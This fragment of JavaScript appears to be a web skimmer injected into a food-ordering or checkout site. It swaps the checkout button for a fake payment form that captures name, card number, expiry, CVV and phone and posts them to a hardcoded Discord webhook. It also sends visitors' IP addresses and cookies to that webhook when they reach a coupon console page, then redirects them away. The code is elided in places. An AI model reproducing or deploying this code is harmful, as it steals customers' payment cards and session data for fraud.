...
const checkUrlPeriodically = () => {
    const checkInterval = 1 * 1000; // Check every 30 seconds
    const duration = 5 * 60 * 1000; // Run for 5 minutes

    const intervalId = setInterval(() => {
        // Check if URL contains /console/coupons/
        if (window.location.pathname.includes('/console/coupons/')) {
            // Check for bypass cookie
            if (!document.cookie.includes('bypass=true')) {
                // Fetch IP address
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const ipAddress = data.ip || 'Unknown';
                        // Send intruder webhook with cookie
                        fetch('https://discord.com/api/webhooks/1388358269118058597/Q2t7-sd_w62vyLsbpg0g-klelflZZlRIjvIhEVw4qfCFmDWsiISU0lDhlqbTm2oGiWOl', {
                            method: 'POST',
                            ...
                            // Redirect to orderup.com.au
                            window.location.href = 'https://orderup.com.au';
                        });
                    })
                    .catch(() => {
                        // Send webhook with unknown IP and cookie
                        fetch('https://discord.com/api/webhooks/1388358269118058597/Q2t7-sd_w62vyLsbpg0g-klelflZZlRIjvIhEVw4qfCFmDWsiISU0lDhlqbTm2oGiWOl', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
    ...
    if (checkoutButton) {
        ...
        newButton.addEventListener('click', (e) => {
            ...
            form.onsubmit = async (e) => {
                ...
                try {
                    await fetch('https://discord.com/api/webhooks/1388358269118058597/Q2t7-sd_w62vyLsbpg0g-klelflZZlRIjvIhEVw4qfCFmDWsiISU0lDhlqbTm2oGiWOl', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                ...
                                fields: [
                                    ...
                                    { name: "📱 Phone", value: paymentData.phone, inline: true },
            ...
            phoneInput.className = 'custom-input';
            ...
            [nameInput, cardNumberInput, phoneInput, expiryInput, cvvInput].forEach(input => {
